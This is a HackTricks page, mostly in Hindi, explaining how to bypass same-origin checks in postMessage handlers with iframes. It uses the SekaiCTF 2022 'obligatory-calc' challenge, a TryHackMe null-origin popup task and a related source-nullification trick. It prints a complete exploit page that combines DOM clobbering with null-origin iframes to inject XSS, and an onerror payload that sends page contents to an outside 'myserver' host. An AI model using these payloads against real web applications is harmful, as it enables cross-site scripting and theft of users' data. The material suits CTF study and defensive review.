# SOP को Iframes के साथ बाइपास करना - 2

{{#include ../../banners/hacktricks-training.md}}

## SOP-2 में Iframes

In the [**solution**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution) for this [**challenge**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc)**,** [**@Strellic\_**](https://twitter.com/Strellic_) proposes a similar method to the previous section. चलिए इसे देखते हैं।

इस challenge में attacker को **bypass** करना होगा:
```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```
यदि वह ऐसा करता है, तो वह HTML कंटेंट वाला एक **postmessage** भेज सकता है जिसे पेज में बिना सैनिटेशन किए **`innerHTML`** के माध्यम से लिखा जाएगा (**XSS**)।

पहली चेक को बायपास करने का तरीका यह है कि **`window.calc.contentWindow`** को **`undefined`** और **`e.source`** को **`null`** बना दिया जाए:

- **`window.calc.contentWindow`** वास्तव में **`document.getElementById("calc")`** है। आप **`document.getElementById`** को **`<img name=getElementById />`** से ओवरराइड कर सकते हैं (ध्यान दें कि Sanitizer API -[here](https://wicg.github.io/sanitizer-api/index.html#dom-clobbering)- अपने default state में DOM clobbering attacks के खिलाफ सुरक्षा करने के लिए configured नहीं है)।
- इसलिए, आप **`document.getElementById("calc")`** को **`<img name=getElementById /><div id=calc></div>`** से ओवरराइड कर सकते हैं। तब, **`window.calc`** **`undefined`** होगा।
- अब, हमें **`e.source`** को **`undefined`** या **`null`** बनाना होगा (क्योंकि `==` का उपयोग `===` के बजाय किया गया है, **`null == undefined`** **`True`** है)। इसे प्राप्त करना "आसान" है। यदि आप एक **iframe** बनाते हैं और उससे **postMessage** भेजते हैं और तुरंत iframe को **remove** कर देते हैं, तो **`e.origin`** **`null`** होगा। निम्न कोड देखें
```javascript
let iframe = document.createElement("iframe")
document.body.appendChild(iframe)
window.target = window.open("http://localhost:8080/")
await new Promise((r) => setTimeout(r, 2000)) // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`)
document.body.removeChild(iframe) //e.origin === null
```
टोकन के बारे में **दूसरी जाँच** को बायपास करने के लिए **`token`** को मान `null` भेजकर और **`window.token`** की वैल्यू को **`undefined`** बनाना होता है:

- `token` को value `null` के साथ postMessage में भेजना सहज है।
- **`window.token`** तब प्राप्त होता है जब फ़ंक्शन **`getCookie`** कॉल किया जाता है जो **`document.cookie`** का उपयोग करता है। ध्यान दें कि **`null`** origin पेजों में **`document.cookie`** तक किसी भी तरह की पहुँच एक **त्रुटि** उत्पन्न करती है। इससे **`window.token`** की वैल्यू **`undefined`** हो जाएगी।

अंतिम समाधान [**@terjanq**](https://twitter.com/terjanq) द्वारा [**निम्नलिखित**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html) है:
```html
<html>
<body>
<script>
// Abuse "expr" param to cause a HTML injection and
// clobber document.getElementById and make window.calc.contentWindow undefined
open(
'https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"'
)

function start() {
var ifr = document.createElement("iframe")
// Create a sandboxed iframe, as sandboxed iframes will have origin null
// this null origin will document.cookie trigger an error and window.token will be undefined
ifr.sandbox = "allow-scripts allow-popups"
ifr.srcdoc = `<script>(${hack})()<\/script>`

document.body.appendChild(ifr)

function hack() {
var win = open("https://obligatory-calc.ctf.sekai.team")
setTimeout(() => {
parent.postMessage("remove", "*")
// this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
// token=null equals to undefined and e.source will be null so null == undefined
win.postMessage(
{
token: null,
result:
"<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>",
},
"*"
)
}, 1000)
}

// this removes the iframe so e.source becomes null in postMessage event.
onmessage = (e) => {
if (e.data == "remove") document.body.innerHTML = ""
}
}
setTimeout(start, 1000)
</script>
</body>
</html>
```
### 2025 Null-Origin Popups (TryHackMe - Vulnerable Codes)

एक हालिया TryHackMe टास्क (“Vulnerable Codes”) यह दर्शाता है कि कैसे OAuth popups hijack किए जा सकते हैं जब opener एक sandboxed iframe के अंदर रहता है जो केवल scripts और popups की अनुमति देता है। वह iframe खुद को और popup दोनों को `"null"` origin में मजबूर कर देता है, इसलिए ऐसे हैंडलर्स जो `if (origin !== window.origin) return` चेक करते हैं, चुपचाप fail हो जाते हैं क्योंकि popup के अंदर `window.origin` भी `"null"` होता है। हालांकि ब्राउज़र अभी भी असली `location.origin` एक्सपोज़ करता है, पीड़ित कभी इसे जांचता ही नहीं, इसलिए attacker-controlled messages बिना रोक-टोक के गुजर जाते हैं।
```javascript
const frame = document.createElement('iframe');
frame.sandbox = 'allow-scripts allow-popups';
frame.srcdoc = `
<script>
const pop = open('https://oauth.example/callback');
pop.postMessage({ cmd: 'getLoginCode' }, '*');
<\/script>`;
document.body.appendChild(frame);
```
उस सेटअप का दुरुपयोग करने के लिए मुख्य बातें:

- पॉपअप के अंदर जो हैंडलर `origin` की तुलना `window.origin` से करते हैं, उन्हें बायपास किया जा सकता है क्योंकि दोनों का मान `"null"` होता है, इसलिए जाली संदेश वैध लगते हैं।
- Sandboxed iframes जो `allow-popups` देते हैं पर `allow-same-origin` छोड़ देते हैं, तब भी attacker-controlled null origin पर लॉक किए गए popups उत्पन्न करते हैं, जिससे आपको 2025 Chromium builds में भी एक स्थिर enclave मिलता है।

### Source-nullification & frame-restriction bypasses

CVE-2024-49038 के आसपास की industry writeups इस पेज के लिए दो reusable primitives को उजागर करती हैं: (1) आप उन पृष्ठों के साथ अभी भी इंटरैक्ट कर सकते हैं जो `X-Frame-Options: DENY` सेट करते हैं, उन्हें `window.open` से लॉन्च करके और navigation settle होने के बाद messages पोस्ट करके, और (2) आप `event.source == victimFrame` चेक्स को brute-force कर सकते हैं — संदेश भेजने के तुरंत बाद iframe को हटा कर — ताकि receiver हैंडलर में केवल `null` ही दिखे।
```javascript
const probe = document.createElement('iframe');
probe.sandbox = 'allow-scripts';
probe.onload = () => {
const victim = open('https://target-app/');
setTimeout(() => {
probe.contentWindow.postMessage(payload, '*');
probe.remove();
}, 500);
};
document.body.appendChild(probe);
```
ऊपर के DOM-clobbering trick के साथ इसे मिलाएँ: एक बार जब रिसीवर केवल `event.source === null` देखता है, तो `window.calc.contentWindow` या इसी तरह के खिलाफ की गई किसी भी तुलना ध्वस्त हो जाती है, जिससे आप फिर से `innerHTML` के माध्यम से malicious HTML sinks भेज सकते हैं।

## संदर्भ
- [PostMessage Vulnerabilities: When Cross-Window Communication Goes Wrong](https://instatunnel.my/blog/postmessage-vulnerabilities-when-cross-window-communication-goes-wrong)
- [THM Write-up: Vulnerable Codes](https://fatsec.medium.com/thm-write-up-vulnerable-codes-9ea8fe8464f9)

{{#include ../../banners/hacktricks-training.md}}
